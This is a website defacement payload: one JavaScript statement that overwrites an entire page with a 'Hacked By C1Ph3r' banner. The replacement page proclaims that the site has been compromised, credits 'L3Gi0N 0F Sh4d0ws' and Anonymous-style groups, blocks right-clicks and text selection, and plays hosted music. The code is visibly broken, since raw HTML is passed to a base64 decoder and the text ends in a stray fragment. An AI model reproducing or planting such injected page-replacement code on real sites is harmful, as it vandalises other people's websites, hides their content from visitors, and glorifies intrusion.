document.documentElement.innerHTML=atob('<!doctypehtml><meta charset=UTF-8><meta content="[!] B FOR BELLA [!]"name=description><meta content="[!] B FOR BELLA [!]"name=keywords><meta content=index,cache http-equiv=cache-control><meta content=index,cache http-equiv=pragma><meta content=black name=theme-color><meta content="IE=edge"http-equiv=X-UA-Compatible><link href=Tod rel=preload as=image/png><link href=https://fonts.googleapis.com rel=preconnect><link href=https://fonts.gstatic.com rel=preconnect crossorigin=""><link href=https://h.top4top.io/p_3059roj7i0.jpg rel=icon><link href="https://fonts.googleapis.com/css2?family=Courier+Prime&family=Roboto&family=Roboto+Mono&display=swap"rel=stylesheet><link href=https://fonts.googleapis.com rel=preconnect><link href=https://fonts.gstatic.com rel=preconnect crossorigin=""><link href="https://fonts.googleapis.com/css2?family=Exo+2&family=Josefin+Sans&display=swap"rel=stylesheet><link href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css rel=stylesheet><script>aud01.play();var viewMode=getCookie("view-mode");"desktop"==viewMode?viewport.setAttribute("content","width=1024"):"mobile"==viewMode&&viewport.setAttribute("content","width=device-width, initial-scale=1.0,maximum-scale=1.0,user-scalable=no")</script><style>body,html{width:100%;background-color:#000;background-image:url(data:image/png;base64,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);word-wrap:break-word;overflow:hidden;background-position:0 0;animation:animatedBackground 10s linear infinite;font-size:25px;text-align:center;cursor:url(http://cur.cursors-4u.net/cursors/cur-9/cur862.ani),url(http://cur.cursors-4u.net/cursors/cur-9/cur862.png),progress!important}.wrapper{font-size:25px}.neil{display:block;text-align:center}.neil img{margin-top:30px}.neil img:hover{animation:shake .5s;animation-iteration-count:infinite}p{padding:5px;margin:2px}#greyshadow{color:gold;font-family:Silent,Monospace;font-size:30px;display:block;text-align:center;margin-top:10px;letter-spacing:10px;width:auto;background-color:transparent}#gs1{color:#3578e5}#gs2{color:red}.text{color:red;font-family:Silent,Monospace;font-size:25px;display:block;text-align:center;margin-top:10px;letter-spacing:8px;width:auto;background-color:transparent}#notag{color:#fff;font-weight:700;letter-spacing:4px;font-family:Electrolize,Monospace;font-size:20.5px;text-align:center}#tagline{font-weight:700;color:#fff;letter-spacing:7px;font-family:Electrolize,Monospace;font-size:20.5px;text-align:center}#taglines{font-weight:700;color:#fff;letter-spacing:4px;font-family:Electrolize,Monospace;font-size:20.5px;text-align:center}#tagliness{font-weight:700;color:red;letter-spacing:4px;font-family:Electrolize,Monospace;font-size:19px;text-align:center}#taglinesss{font-weight:700;color:#fff;letter-spacing:4px;font-family:Electrolize,Monospace;font-size:19px;text-align:center}#pages{margin-bottom:10px;font-weight:700;background-color:transparent;letter-spacing:3px;font-family:Electrolize,Monospace;color:#609af7;font-size:19.5px;text-align:center;background:0 0;text-decoration:none;display:block}#pages:hover{background:0 0;text-decoration:none;display:block;color:#2574f4}.footer{position:fixed;left:0;right:0;bottom:0;background:0 0;text-align:center;color:#fff}@keyframes animatedBackground{from{background-position:0 0}to{background-position:0 100%}}#logo{background-image:url(https://goo.gl/CJHgvw)}@media screen and (max-width:480px){body{font-size:10px}#greyshadow{color:gold;font-size:20px}.text{font-size:14px}#notag{font-size:10px}#tagline{font-size:10px}#taglines{font-size:10px}#tagliness{font-size:10px}#taglinesss{font-size:8px}#pages{font-size:10px}.neil img{width:200px;margin-top:10px}}:root{--white:#FFFFFF;--img:invert(0%) sepia(0%) saturate(9%) hue-rotate(204deg) brightness(108%) contrast(103%)}.parent{display:flex;justify-content:center;align-items:center}img{margin-left:auto;margin-right:auto;justify-content:center;align-items:center;transition:filter .5s;overflow:hidden}.texts{margin:auto;color:var(--white);font-family:'Josefin Sans',sans-serif}.texts2{margin:auto;color:var(--white);font-weight:bolder;font-family:sans-serif;opacity:50%}.texts3{margin:auto;font-family:'Courier Prime',monospace}body,html{height:100%;margin:0;padding:0;overflow:hidden}.container{display:flex;justify-content:center;height:100%}.middle{display:flex;align-items:center;justify-content:center;height:100%}.cusbtn{content:' ';background-color:#4caf4f00;border:.1rem solid var(--white);color:var(--white);padding:10px 27px;text-align:center;text-decoration:none;display:inline-block;font-size:20px;margin:4px 2px;cursor:pointer}.boxborder{border:.1rem solid var(--white);padding:0}.drp{font-size:15px;color:var(--white);background:#000;font-family:Roboto,sans-serif}.type{display:inline-block;vertical-align:bottom}.type>span{color:#14f3db;display:grid;overflow:hidden;height:1.2em}.type span span{width:0%;line-height:1.7;max-width:max-content;overflow:hidden;height:inherit;word-break:break-all;animation:t 2s linear infinite alternate,m 12s steps(3) infinite}.type span span:before{content:" ";display:inline-block}@keyframes t{100%,90%{width:100%}}@keyframes c{0%,100%{box-shadow:3px 0 0 #0000}50%{box-shadow:3px 0 0 #fff}}@keyframes m{100%{transform:translateY(-300%)}}</style><title>//:~Hacked By C1Ph3r~://</title><script>var rev="silent";function titlebar(t){var e="Hacked By C1Ph3r",i=t,r=(e=""+e).length;if("silent"==rev)i<r?(i+=1,scroll=e.substr(0,i),document.title=scroll):rev="silents",timer=window.setTimeout("titlebar("+i+")",70);else if(0<i){var l=r-(i-=1);scrol=e.substr(l,r),document.title=scrol,timer=window.setTimeout("titlebar("+i+")",70)}else rev="silent",timer=window.setTimeout("titlebar("+i+")",70)}titlebar(0)</script><script>function disableselect(e){return!1}function reEnable(){return!0}document.onselectstart=new Function("return false"),window.sidebar&&(document.onmousedown=disableselect,document.onclick=reEnable);var message="";function clickIE(){if(document.all)return!1}function clickNS(e){if((document.layers||document.getElementById&&!document.all)&&(2==e.which||3==e.which))return!1}document.layers?(document.captureEvents(Event.MOUSEDOWN),document.onmousedown=clickNS):(document.onmouseup=clickNS,document.oncontextmenu=clickIE),document.oncontextmenu=new Function('alert("~/ C1Ph3r Was Here /~"); return false')</script><body bgcolor=black onload=display_ct7() scroll=no style=overflow:hidden><script>function display_ct7(){var t=new Date,e=12<=t.getHours()?" PM":" AM";hours=t.getHours(),hours=hours||12,hours=1==hours.toString().length?0+hours.toString():hours;var n=t.getMinutes().toString();n=1==n.length?0+n:n;var r=t.getSeconds().toString();r=1==r.length?0+r:r;var o=(t.getMonth()+1).toString();o=1==o.length?0+o:o;var g=t.getDate().toString(),s=o+"/"+(g=1==g.length?0+g:g)+"/"+t.getFullYear();s=s+" - "+hours+":"+n+":"+r+" "+e,document.getElementById("ct7").innerHTML=s,display_c7()}function display_c7(){mytime=setTimeout("display_ct7()",1e3)}display_c7()</script><script>var marginbottom,marginright,timer,snowmax=40,snowcolor=new Array("#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF"),snowtype=new Array("Arial Black","Arial Narrow","Times","Comic Sans MS"),snowletter="",sinkspeed=.6,snowmaxsize=15,snowminsize=8,snowingzone=1,snow=new Array,i_snow=0,x_mv=new Array,crds=new Array,lftrght=new Array,browserinfos=navigator.userAgent,ie5=document.all&&document.getElementById&&!browserinfos.match(/Opera/),ns6=document.getElementById&&!document.all,opera=browserinfos.match(/Opera/),browserok=ie5||ns6||opera;function randommaker(n){return rand=Math.floor(n*Math.random()),rand}function initsnow(){ie5||opera?(marginbottom=document.body.clientHeight,marginright=document.body.clientWidth):ns6&&(marginbottom=window.innerHeight,marginright=window.innerWidth);var n=snowmaxsize-snowminsize;for(i=0;i<=snowmax;i++)crds[i]=0,lftrght[i]=15*Math.random(),x_mv[i]=.03+Math.random()/10,snow[i]=document.getElementById("s"+i),snow[i].style.fontFamily=snowtype[randommaker(snowtype.length)],snow[i].size=randommaker(n)+snowminsize,snow[i].style.fontSize=snow[i].size,snow[i].style.color=snowcolor[randommaker(snowcolor.length)],snow[i].sink=sinkspeed*snow[i].size/5,1==snowingzone&&(snow[i].posx=randommaker(marginright-snow[i].size)),2==snowingzone&&(snow[i].posx=randommaker(marginright/2-snow[i].size)),3==snowingzone&&(snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4),4==snowingzone&&(snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2),snow[i].posy=randommaker(2*marginbottom-marginbottom-2*snow[i].size),snow[i].style.left=snow[i].posx,snow[i].style.top=snow[i].posy;movesnow()}function movesnow(){for(i=0;i<=snowmax;i++)crds[i]+=x_mv[i],snow[i].posy+=snow[i].sink,snow[i].style.left=snow[i].posx+lftrght[i]*Math.sin(crds[i]),snow[i].style.top=snow[i].posy,(snow[i].posy>=marginbottom-2*snow[i].size||parseInt(snow[i].style.left)>marginright-3*lftrght[i])&&(1==snowingzone&&(snow[i].posx=randommaker(marginright-snow[i].size)),2==snowingzone&&(snow[i].posx=randommaker(marginright/2-snow[i].size)),3==snowingzone&&(snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4),4==snowingzone&&(snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2),snow[i].posy=0);setTimeout("movesnow()",50)}for(i=0;i<=snowmax;i++)document.write("<span id='s"+i+"' style='position:absolute;top:-"+snowmaxsize+"'>"+snowletter+"</span>");browserok&&(window.onload=initsnow)</script><script>function disableselect(e){return!1}function reEnable(){return!0}document.onselectstart=new Function("return false"),window.sidebar&&(document.onmousedown=disableselect,document.onclick=reEnable);var message="";function clickIE(){if(document.all)return!1}function clickNS(e){if((document.layers||document.getElementById&&!document.all)&&(2==e.which||3==e.which))return!1}document.layers?(document.captureEvents(Event.MOUSEDOWN),document.onmousedown=clickNS):(document.onmouseup=clickNS,document.oncontextmenu=clickIE),document.oncontextmenu=new Function('alert("~/ C1Ph3r Was Here /~"); return false')</script><div style=min-height:100% class=container><div style=min-height:100% class=middle><div style=text-align:center;width:2000px;top:5%><img alt=Pwn3d border=0 height=400 src=https://i.ibb.co/y3rVw95/Meme-Hacking-GIF.gif width=700><style>img:hover{animation:shake .5s;animation-iteration-count:infinite}@keyframes shake{0%{transform:translate(1px,1px) rotate(0)}10%{transform:translate(-1px,-2px) rotate(-1deg)}20%{transform:translate(-3px,0) rotate(1deg)}30%{transform:translate(3px,2px) rotate(0)}40%{transform:translate(1px,-1px) rotate(1deg)}50%{transform:translate(-1px,2px) rotate(-1deg)}60%{transform:translate(-3px,1px) rotate(0)}70%{transform:translate(3px,1px) rotate(-1deg)}80%{transform:translate(-1px,-1px) rotate(1deg)}90%{transform:translate(1px,2px) rotate(0)}100%{transform:translate(1px,-2px) rotate(-1deg)}}</style><br><br><br><br><font class=texts size=6><span style=opacity:50%>[+]---</span><span style=font-weight:700> Hacked By ./C1Ph3r</span><span style=opacity:50%>---[+]</span></font><div style=margin:auto;margin-top:10px;background-color:var(--white);width:300px;height:3px class=texts2></div><br><font class=texts3 size=5 color=white><span>./L3Gi0N 0F Sh4d0ws</span></font><br><br><br><font class=texts3 size=6 color=red>“ Your website has been compromised”</font><br><font class=texts3 size=6 color=white>NO SYSTEM IS SAFE!</font><br><font class=texts3 size=5 style=opacity:50% color=white><br><br><i>– [!] WE ARE AN0NYM0US [!] –</i></font><br><br><br><div style=margin:auto;background-color:var(--white);width:830px;height:3px class=texts2></div><div style=margin:auto;width:850px;height:25px class=parent align=center><font class=texts2 size=6>||</font> <font class=texts size=5 style=font-weight:700;margin-top:10px>Greetz </font><font class=texts2 size=6>:</font><div style=width:650px;height:25px class=parent align=center><font class=texts size=5 style=font-weight:700;margin-top:10px><marquee>- LOS - C1Ph3r - CYBER - L3Gi0N 0F SHAD0WS - HACKERS - CRIME - ANONYMOUS</marquee></font></div><font class=texts2 size=6>||</font></div><br><div style=margin:auto;background-color:var(--white);width:830px;height:3px class=texts2></div><br><div style=margin:auto;width:400px;height:40px class="parent boxborder"align=center><div style=margin:auto;width:395px;height:30px class=parent align=center><select class="cusbtn select"id=audios name=audios style="padding:0 0;width:30px;height:30px;font-size:15px;margin-left:2px"title="Audio Library"><option class=drp value=01>| TIMELESS |<option class=drp value=02>| INDILA |<option class=drp value=04>| EMINEM STAN |<option class=drp value=05>| DANDELIONS |</select> <button class=cusbtn id=play onclick=play() style="width:30px;height:30px;padding:0 0;font-size:20px;margin-right:2px;margin-left:2px"title="Play Audio"><i class="fa fa-play-circle"></i></button> <button class=cusbtn id=pause onclick=pause() style="opacity:50%;width:30px;height:30px;padding:0 0;font-size:20px;margin-right:2px;margin-left:2px"title="Pause Audio"><i class="fa fa-stop-circle"></i></button> <button class=cusbtn id=looptrue onclick=looptrue() style="width:30px;height:30px;padding:0 0"title="Repeat OFF"><i class="fa fa-retweet"style=color:#fff></i></button> <button class=cusbtn id=loopfalse onclick=loopfalse() style="opacity:50%;width:30px;height:30px;padding:0 0"title="Repeat ON"><i class="fa fa-retweet"style=color:#fff></i></button><div style=margin:auto;width:240px;height:17px;padding:5px;margin-right:2px;margin-left:2px;overflow:hidden class="parent boxborder"align=center><span class="1.6; line-height: type"><span style=background-color:#000;margin:auto;height:35px><span style=font-weight:700;height:30px class=texts size=3>TAP PLAY FOR</span> <span style=font-weight:700;height:30px class=texts size=3 id=title>MUSIC</span> <span style=font-weight:700;height:30px class=texts size=3>Pwn3d By ./C1Ph3r</span></span></span></div><div style=margin:auto;width:50px;height:17px;padding:5px;margin-right:2px;margin-left:2px class=boxborder align=center><font class=texts size=2 style="font-weight:700;font-family:'Roboto Mono'"id=timeleft>00:00</font></div></div></div><br><font class=texts size=5 style="opacity:50%;color:var(--white);font-family:'Roboto Mono',monospace"id=ct7></font><br><br><font class=texts size=4 style="opacity:50%;color:var(--white);font-family:'Roboto Mono',monospace">L3Gi0N 0F SHAD0WS</font> l<audio id=aud01 src=https://c.top4top.io/m_3349cmjyb0.mp3></audio><audio id=aud02 src=https://i.top4top.io/m_3352ngi8l3.mp3></audio><audio id=aud04 src=https://e.top4top.io/m_3359l0xhg0.mp3></audio><audio id=aud05 src=https://f.top4top.io/m_335940ip81.mp3></audio></div></div></div><script>var Audloop = 0;

    paragraph = document.getElementById("title");

    document.getElementById("audios").onchange = function() {title()};



    function title()

    {

      var x = document.getElementById("audios").value;

      if(x == 01){

        paragraph.innerHTML = "TIMELESS";

      }

            else if(x == 02){

        paragraph.innerHTML = "INDILA";

      }

            else if(x == 03){ 

        paragraph.innerHTML = "EMINEM STAN";

      }

            else if(x == 04){ 

        paragraph.innerHTML = "EMINEM STAN";

      }

           else if(x == 05){ 

        paragraph.innerHTML = "DANDELIONS";

      }

    }



      const looptrue = document.getElementById('looptrue');

    const loopfalse = document.getElementById('loopfalse');



    loopfalse.style.display = 'none';

    

    looptrue.addEventListener('click', () => {

    looptrue.style.display = 'none';

    loopfalse.style.display = 'block';

    Audloop = 1;

    });

    

    loopfalse.addEventListener('click', () => {

    looptrue.style.display = 'block';

    loopfalse.style.display = 'none';

    Audloop = 0;

    });

    



        document.getElementById('pause').style.display = 'none';



       

        document.querySelectorAll('audio').forEach(el => el.addEventListener('ended', function (e) {

            document.getElementById('pause').style.display = 'none';

            document.getElementById('play').style.display = 'block';

            var endedTag=e.target;

        }));



        function pause() {

      

            document.getElementById('pause').style.display = 'none';

            document.getElementById('play').style.display = 'block';

            document.querySelectorAll('audio').forEach(el => el.pause());

        }



        function timeLeft(player) {

          var aud = document.getElementById(player);

          // Countdown

          aud.addEventListener("timeupdate", function() {

              var timeleft = document.getElementById('timeleft'),

                  duration = parseInt( aud.duration ),

                  currentTime = parseInt( aud.currentTime ),

                  timeLeft = duration - currentTime,

                  s, m;

              

              

              s = timeLeft % 60;

              m = Math.floor( timeLeft / 60 ) % 60;

              

              s = s < 10 ? "0"+s : s;

              m = m < 10 ? "0"+m : m;

              

              timeleft.innerHTML = m+":"+s;

              

          }, false);



        }



      function play() {

        document.getElementById('pause').style.display = 'block';

        document.getElementById('play').style.display = 'none';



      var Aud = document.getElementById("audios").value;

        var aud01 = document.getElementById("aud01");

        var aud02 = document.getElementById("aud02");

        var aud03 = document.getElementById("aud03");

        var aud04 = document.getElementById("aud04");

        var aud05 = document.getElementById("aud05");

    

        if(Aud==01){

        title()

        aud01.play();

        aud01.currentTime = 0;

        timeLeft("aud01")

        if(Audloop == 1){

        aud01.loop = true;

        timeLeft("aud01")

        }else if(Audloop == 0){ aud01.loop = false; };

    }



    else if(Aud==02){

        title()

        aud02.play();

        aud02.currentTime = 0;

        timeLeft("aud02")

        if(Audloop == 1){

        aud02.loop = true;

        timeLeft("aud02")

        }else if(Audloop == 0){ aud02.loop = false; };

    }



    else if(Aud==03){

        title()

        aud03.play();

        aud03.currentTime = 0;

        timeLeft("aud03")

        if(Audloop == 1){

        aud03.loop = true;

        timeLeft("aud03")

        }else if(Audloop == 0){ aud03.loop = false; };

    }



    else if(Aud==04){

        title()

        aud04.play();

        aud04.currentTime = 0;

        timeLeft("aud04")

        if(Audloop == 1){

        aud04.loop = true;

        timeLeft("aud04")

        }else if(Audloop == 0){ aud04.loop = false; };

    }

    else if(Aud==05){

        title()

        aud05.play();

        aud05.currentTime = 0;

        timeLeft("aud05")

        if(Audloop == 1){

        aud05.loop = true;

        timeLeft("aud05")

        }else if(Audloop == 0){ aud05.loop = false; };

    }



      }</script>" target="_blank">');